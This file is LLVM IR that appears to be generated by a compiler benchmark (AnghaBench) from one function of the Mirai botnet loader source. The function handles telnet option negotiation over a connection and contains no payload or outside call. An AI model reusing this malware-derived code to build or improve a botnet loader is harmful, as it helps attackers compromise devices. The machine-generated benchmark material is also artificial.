; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/loader/src/extr_connection.c_connection_consume_iacs.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/loader/src/extr_connection.c_connection_consume_iacs.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.connection = type { i32*, i32, i32 }

@__const.connection_consume_iacs.tmp1 = private unnamed_addr constant [3 x i32] [i32 255, i32 251, i32 31], align 4
@__const.connection_consume_iacs.tmp2 = private unnamed_addr constant [9 x i32] [i32 255, i32 250, i32 31, i32 0, i32 80, i32 0, i32 24, i32 255, i32 240], align 16
@MSG_NOSIGNAL = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @connection_consume_iacs(%struct.connection* %0) #0 {
  %2 = alloca %struct.connection*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [3 x i32], align 4
  %7 = alloca [9 x i32], align 16
  store %struct.connection* %0, %struct.connection** %2, align 8
  store i32 0, i32* %3, align 4
  %8 = load %struct.connection*, %struct.connection** %2, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 0
  %10 = load i32*, i32** %9, align 8
  store i32* %10, i32** %4, align 8
  br label %11

11:                                               ; preds = %132, %37, %1
  %12 = load i32, i32* %3, align 4
  %13 = load %struct.connection*, %struct.connection** %2, align 8
  %14 = getelementptr inbounds %struct.connection, %struct.connection* %13, i32 0, i32 1
  %15 = load i32, i32* %14, align 8
  %16 = icmp slt i32 %12, %15
  br i1 %16, label %17, label %133

17:                                               ; preds = %11
  %18 = load i32*, i32** %4, align 8
  %19 = load i32, i32* %18, align 4
  %20 = icmp ne i32 %19, 255
  br i1 %20, label %21, label %22

21:                                               ; preds = %17
  br label %133

22:                                               ; preds = %17
  %23 = load i32*, i32** %4, align 8
  %24 = load i32, i32* %23, align 4
  %25 = icmp eq i32 %24, 255
  br i1 %25, label %26, label %131

26:                                               ; preds = %22
  %27 = load %struct.connection*, %struct.connection** %2, align 8
  %28 = load i32*, i32** %4, align 8
  %29 = call i32 @can_consume(%struct.connection* %27, i32* %28, i32 1)
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %32, label %31

31:                                               ; preds = %26
  br label %133

32:                                               ; preds = %26
  %33 = load i32*, i32** %4, align 8
  %34 = getelementptr inbounds i32, i32* %33, i64 1
  %35 = load i32, i32* %34, align 4
  %36 = icmp eq i32 %35, 255
  br i1 %36, label %37, label %42

37:                                               ; preds = %32
  %38 = load i32*, i32** %4, align 8
  %39 = getelementptr inbounds i32, i32* %38, i64 2
  store i32* %39, i32** %4, align 8
  %40 = load i32, i32* %3, align 4
  %41 = add nsw i32 %40, 2
  store i32 %41, i32* %3, align 4
  br label %11

42:                                               ; preds = %32
  %43 = load i32*, i32** %4, align 8
  %44 = getelementptr inbounds i32, i32* %43, i64 1
  %45 = load i32, i32* %44, align 4
  %46 = icmp eq i32 %45, 253
  br i1 %46, label %47, label %78

47:                                               ; preds = %42
  %48 = bitcast [3 x i32]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %48, i8* align 4 bitcast ([3 x i32]* @__const.connection_consume_iacs.tmp1 to i8*), i64 12, i1 false)
  %49 = bitcast [9 x i32]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %49, i8* align 16 bitcast ([9 x i32]* @__const.connection_consume_iacs.tmp2 to i8*), i64 36, i1 false)
  %50 = load %struct.connection*, %struct.connection** %2, align 8
  %51 = load i32*, i32** %4, align 8
  %52 = call i32 @can_consume(%struct.connection* %50, i32* %51, i32 2)
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %55, label %54

54:                                               ; preds = %47
  br label %133

55:                                               ; preds = %47
  %56 = load i32*, i32** %4, align 8
  %57 = getelementptr inbounds i32, i32* %56, i64 2
  %58 = load i32, i32* %57, align 4
  %59 = icmp ne i32 %58, 31
  br i1 %59, label %60, label %61

60:                                               ; preds = %55
  br label %79

61:                                               ; preds = %55
  %62 = load i32*, i32** %4, align 8
  %63 = getelementptr inbounds i32, i32* %62, i64 3
  store i32* %63, i32** %4, align 8
  %64 = load i32, i32* %3, align 4
  %65 = add nsw i32 %64, 3
  store i32 %65, i32* %3, align 4
  %66 = load %struct.connection*, %struct.connection** %2, align 8
  %67 = getelementptr inbounds %struct.connection, %struct.connection* %66, i32 0, i32 2
  %68 = load i32, i32* %67, align 4
  %69 = getelementptr inbounds [3 x i32], [3 x i32]* %6, i64 0, i64 0
  %70 = load i32, i32* @MSG_NOSIGNAL, align 4
  %71 = call i32 @send(i32 %68, i32* %69, i32 3, i32 %70)
  %72 = load %struct.connection*, %struct.connection** %2, align 8
  %73 = getelementptr inbounds %struct.connection, %struct.connection* %72, i32 0, i32 2
  %74 = load i32, i32* %73, align 4
  %75 = getelementptr inbounds [9 x i32], [9 x i32]* %7, i64 0, i64 0
  %76 = load i32, i32* @MSG_NOSIGNAL, align 4
  %77 = call i32 @send(i32 %74, i32* %75, i32 9, i32 %76)
  br label %129

78:                                               ; preds = %42
  br label %79

79:                                               ; preds = %78, %60
  %80 = load %struct.connection*, %struct.connection** %2, align 8
  %81 = load i32*, i32** %4, align 8
  %82 = call i32 @can_consume(%struct.connection* %80, i32* %81, i32 2)
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %85, label %84

84:                                               ; preds = %79
  br label %133

85:                                               ; preds = %79
  store i32 0, i32* %5, align 4
  br label %86

86:                                               ; preds = %115, %85
  %87 = load i32, i32* %5, align 4
  %88 = icmp slt i32 %87, 3
  br i1 %88, label %89, label %118

89:                                               ; preds = %86
  %90 = load i32*, i32** %4, align 8
  %91 = load i32, i32* %5, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i32, i32* %90, i64 %92
  %94 = load i32, i32* %93, align 4
  %95 = icmp eq i32 %94, 253
  br i1 %95, label %96, label %101

96:                                               ; preds = %89
  %97 = load i32*, i32** %4, align 8
  %98 = load i32, i32* %5, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i32, i32* %97, i64 %99
  store i32 252, i32* %100, align 4
  br label %114

101:                                              ; preds = %89
  %102 = load i32*, i32** %4, align 8
  %103 = load i32, i32* %5, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i32, i32* %102, i64 %104
  %106 = load i32, i32* %105, align 4
  %107 = icmp eq i32 %106, 251
  br i1 %107, label %108, label %113

108:                                              ; preds = %101
  %109 = load i32*, i32** %4, align 8
  %110 = load i32, i32* %5, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds i32, i32* %109, i64 %111
  store i32 253, i32* %112, align 4
  br label %113

113:                                              ; preds = %108, %101
  br label %114

114:                                              ; preds = %113, %96
  br label %115

115:                                              ; preds = %114
  %116 = load i32, i32* %5, align 4
  %117 = add nsw i32 %116, 1
  store i32 %117, i32* %5, align 4
  br label %86

118:                                              ; preds = %86
  %119 = load %struct.connection*, %struct.connection** %2, align 8
  %120 = getelementptr inbounds %struct.connection, %struct.connection* %119, i32 0, i32 2
  %121 = load i32, i32* %120, align 4
  %122 = load i32*, i32** %4, align 8
  %123 = load i32, i32* @MSG_NOSIGNAL, align 4
  %124 = call i32 @send(i32 %121, i32* %122, i32 3, i32 %123)
  %125 = load i32*, i32** %4, align 8
  %126 = getelementptr inbounds i32, i32* %125, i64 3
  store i32* %126, i32** %4, align 8
  %127 = load i32, i32* %3, align 4
  %128 = add nsw i32 %127, 3
  store i32 %128, i32* %3, align 4
  br label %129

129:                                              ; preds = %118, %61
  br label %130

130:                                              ; preds = %129
  br label %131

131:                                              ; preds = %130, %22
  br label %132

132:                                              ; preds = %131
  br label %11

133:                                              ; preds = %84, %54, %31, %21, %11
  %134 = load i32, i32* %3, align 4
  ret i32 %134
}

declare dso_local i32 @can_consume(%struct.connection*, i32*, i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @send(i32, i32*, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
